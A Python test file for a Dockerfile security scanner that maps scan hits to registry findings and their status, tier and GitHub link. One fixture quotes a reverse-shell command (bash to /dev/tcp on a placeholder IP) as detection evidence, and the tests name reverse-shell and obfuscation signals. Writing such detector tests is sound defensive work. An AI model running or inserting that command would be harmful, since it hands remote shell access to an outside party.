"""Tests for cli.py's Dockerfile-finding <-> registry mapping.

The rest of cli.py is thin argparse/print glue exercised by hand; this pins
the one piece of real logic added when Dockerfile scan results were wired
into the shared registry: the ImageFinding it builds must be correctly keyed,
statused, and carry the GitHub link for the dashboard.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from knorr.cli import _finding_from_dockerfile_hit
from knorr.models import DetectionMethod, FindingStatus


@dataclass
class _FakeHit:
    """Mirrors scanning.dockerfile.DockerfileHit's public shape."""
    repo: str
    path: str
    url: str
    score: int = 0
    tier: str | None = None
    confirmed: bool = False
    signals: list[str] = field(default_factory=list)
    confirming: list[dict] = field(default_factory=list)


def test_confirmed_hit_maps_to_confirmed_status():
    hit = _FakeHit(repo="DVKunion/test_ci", path="Dockerfile",
                   url="https://github.com/DVKunion/test_ci/blob/abc/Dockerfile",
                   score=5, tier="A:reverse_shell", confirmed=True,
                   signals=["reverse_shell/bash-tcp"],
                   confirming=[{"category": "reverse_shell", "rule": "bash-tcp",
                                "evidence": "bash -i >&/dev/tcp/1.2.3.4/80 0>&1"}])
    f = _finding_from_dockerfile_hit(hit)
    assert f.status == FindingStatus.CONFIRMED
    assert f.detection_method == DetectionMethod.DOCKERFILE_SCAN
    assert f.image == "github.com/dvkunion/test_ci:dockerfile"
    assert f.tier == "A:reverse_shell"
    assert f.score == 5
    assert f.confirming == hit.confirming
    assert f.evidence["dockerfile_url"] == hit.url
    assert f.publisher == "dvkunion"


def test_unconfirmed_high_score_maps_to_screened():
    hit = _FakeHit(repo="org/repo", path="Dockerfile", url="https://x", score=6)
    f = _finding_from_dockerfile_hit(hit)
    assert f.status == FindingStatus.SCREENED


def test_unconfirmed_low_score_maps_to_candidate():
    hit = _FakeHit(repo="org/repo", path="Dockerfile", url="https://x", score=1)
    f = _finding_from_dockerfile_hit(hit)
    assert f.status == FindingStatus.CANDIDATE


def test_image_key_is_reversible_to_repo_and_path():
    """cli.py derives `known` for scan_dockerfiles by stripping the
    "github.com/" prefix back to a "repo:path" key; the format must round-trip."""
    hit = _FakeHit(repo="Owner/Repo", path="docker/Dockerfile.prod", url="https://x")
    f = _finding_from_dockerfile_hit(hit)
    assert f.image.startswith("github.com/")
    stripped = f.image[len("github.com/"):]
    assert stripped == "owner/repo:docker/dockerfile.prod"


def test_reasoning_includes_facets():
    hit = _FakeHit(repo="org/repo", path="Dockerfile", url="https://x",
                   signals=["reverse_shell/bash-tcp", "obfuscation/eval-atob"])
    f = _finding_from_dockerfile_hit(hit)
    assert "reverse_shell" in f.reasoning
    assert "obfuscation" in f.reasoning
